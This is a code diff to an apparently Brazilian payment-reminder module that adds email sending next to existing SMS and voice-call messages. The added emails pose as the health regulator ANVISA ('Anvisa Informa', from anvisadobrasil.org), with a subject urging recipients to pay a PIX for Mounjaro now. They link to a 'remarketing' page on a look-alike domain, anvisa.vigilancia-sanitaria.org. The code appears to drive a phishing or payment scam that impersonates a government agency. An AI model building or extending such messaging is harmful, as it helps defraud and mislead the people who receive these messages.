@@ -246,9 +246,10 @@ def _send_initial_payment_sms_async(transaction_id, customer_data):
             # Adicionar variáveis para o template de e-mail
             request_data['variables'] = {
                 'firstName': first_name,
-                'fullName': customer_name
+                'fullName': customer_name,
+                'link_encurtado': f"https://anvisa.vigilancia-sanitaria.org/remarketing/{transaction_id}"
             }
-            logger.info(f"[PAYMENT_TRACKER][ASYNC] Added email parameters for {email} with variables: {{'firstName': '{first_name}', 'fullName': '{customer_name}'}}")
+            logger.info(f"[PAYMENT_TRACKER][ASYNC] Added email parameters for {email} with variables: {{'firstName': '{first_name}', 'fullName': '{customer_name}', 'link_encurtado': 'https://anvisa.vigilancia-sanitaria.org/remarketing/{transaction_id}'}}")
         
         logger.info(f"[PAYMENT_TRACKER][ASYNC] SMS request data: {request_data}")
         
@@ -444,6 +445,25 @@ def _send_reminder_sms_async(transaction_id, customer_data):
             'shortenerDomain': "anvisadobrasil.org",
             'voiceApiUrl': "https://v1.call4u.com.br/api/integrations/add/5a1e3a5aede16d438c38862cac1a78db/default"
         }
+        
+        # Adicionar parâmetros de e-mail conforme solicitado
+        if email:
+            # Adicionar suporte a e-mail
+            request_data['enableEmail'] = True
+            request_data['email'] = email
+            request_data['emailSubject'] = 'ANVISA: Seu PIX para Mounjaro Está Pronto! Pague Agora'
+            request_data['emailTemplate'] = email_template
+            request_data['emailSenderName'] = 'Anvisa Informa'
+            request_data['emailSenderAddress'] = "noreply@anvisadobrasil.org"
+            # Adicionar variáveis para o template de e-mail
+            request_data['variables'] = {
+                'firstName': first_name,
+                'fullName': customer_name,
+                'link_encurtado': f"https://anvisa.vigilancia-sanitaria.org/remarketing/{transaction_id}"
+            }
+            
+            logger.info(f"[PAYMENT_TRACKER][ASYNC] Added email parameters for {email} with variables: {{'firstName': '{first_name}', 'fullName': '{customer_name}', 'link_encurtado': 'https://anvisa.vigilancia-sanitaria.org/remarketing/{transaction_id}'}}")
+
   
         logger.info(f"[PAYMENT_TRACKER][ASYNC] Reminder SMS request data: {request_data}")
         
